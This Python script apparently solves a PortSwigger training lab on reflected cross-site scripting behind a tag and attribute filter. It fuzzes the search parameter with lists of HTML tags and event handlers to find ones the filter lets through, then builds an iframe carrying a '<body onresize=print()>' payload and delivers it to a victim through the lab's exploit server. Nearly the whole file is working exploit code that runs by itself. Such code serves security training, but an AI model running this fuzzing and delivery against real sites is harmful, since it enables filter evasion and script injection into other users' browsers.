#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked
Fuzzes for allowed tags/events, then delivers a <body onresize=print()> payload via the exploit server.
"""

import argparse
import requests
import re
import sys
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Common tags to test (subset — full list from PortSwigger XSS cheat sheet)
TAGS = [
    "a", "animate", "animatetransform", "audio", "b", "body", "br", "button",
    "canvas", "details", "div", "dl", "embed", "fieldset", "form", "h1",
    "hr", "html", "iframe", "img", "input", "keygen", "link", "marquee",
    "math", "meta", "meter", "object", "ol", "option", "output", "p",
    "pre", "progress", "q", "script", "select", "source", "style", "svg",
    "table", "td", "textarea", "title", "tr", "ul", "var", "video", "xmp",
    "custom tags",
]

EVENTS = [
    "onafterprint", "onbeforeprint", "onbeforeunload", "onblur", "oncanplay",
    "onchange", "onclick", "oncontextmenu", "ondblclick", "ondrag", "ondragend",
    "ondragenter", "ondragleave", "ondragover", "ondragstart", "ondrop",
    "onerror", "onfocus", "onhashchange", "oninput", "onkeydown", "onkeypress",
    "onkeyup", "onload", "onmessage", "onmousedown", "onmouseenter",
    "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup",
    "onoffline", "ononline", "onpagehide", "onpageshow", "onpopstate",
    "onresize", "onscroll", "onsearch", "onsubmit", "ontoggle", "onunload",
    "onwheel",
]


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 14: HTML context with most tags and attributes blocked"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    parser.add_argument("exploit_server", help="Exploit server URL (e.g. https://exploit-0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_server.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Fuzz for allowed tags
    print("[*] Fuzzing for allowed tags...")
    allowed_tags = []
    for tag in TAGS:
        r = s.get(f"{lab}/?search=<{tag}>")
        if r.status_code == 200:
            allowed_tags.append(tag)
            print(f"  [+] Allowed: <{tag}>")

    if "body" not in allowed_tags:
        print("[-] <body> not allowed — manual investigation needed")
        print(f"    Allowed tags found: {allowed_tags}")
        sys.exit(1)

    # Step 2: Fuzz for allowed events on <body>
    print("[*] Fuzzing for allowed events on <body>...")
    allowed_events = []
    for event in EVENTS:
        r = s.get(f"{lab}/?search=<body {event}=1>")
        if r.status_code == 200:
            allowed_events.append(event)
            print(f"  [+] Allowed: {event}")

    if "onresize" not in allowed_events:
        print(f"[-] onresize not allowed — try these events: {allowed_events}")
        sys.exit(1)

    # Step 3: Deliver exploit via exploit server
    search_payload = quote("<body onresize=print()>")
    poc = f'<iframe src="{lab}/?search={search_payload}" onload="this.style.width=\'100px\'">'

    print(f"[+] Exploit payload:\n    {poc}")

    def exploit_action(action):
        return s.post(f"{exploit}/", data={
            "urlIsHttps": "true",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "responseBody": poc,
            "formAction": action,
        })

    exploit_action("STORE")
    print("[+] Exploit stored on exploit server")

    exploit_action("DELIVER_TO_VICTIM")
    print("[+] Exploit delivered to victim")

    # Step 4: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Check lab page — may take a moment for the victim to visit")


if __name__ == "__main__":
    main()
